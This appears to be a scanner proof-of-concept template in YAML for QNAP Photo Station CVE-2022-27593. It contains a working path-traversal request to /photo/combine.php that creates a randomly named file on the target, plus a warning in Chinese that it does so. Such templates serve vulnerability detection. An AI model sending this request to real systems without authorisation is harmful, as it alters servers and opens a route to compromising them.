name: poc-yaml-qnap-cve-2022-27593-fileupload
manual: true
transport: http
set:
    rStr0: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /photo/combine.php?type=javascript&g=core-r7rules/../../../{{rStr0}}.php.
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("(function(){") && response.body_string.contains("module.exports") && response.headers["Content-Type"].contains("application/javascript")
expression: r0()
detail:
    author: Editor
    links:
        - https://attackerkb.com/topics/7We3SjEYVo/cve-2022-27593
    vulnerability:
        id: CT-483139
        level: critical
    warning: 这将会在目标系统上创建一个文件开头是{{rStr0}}.php.,结尾是.javascript的文件
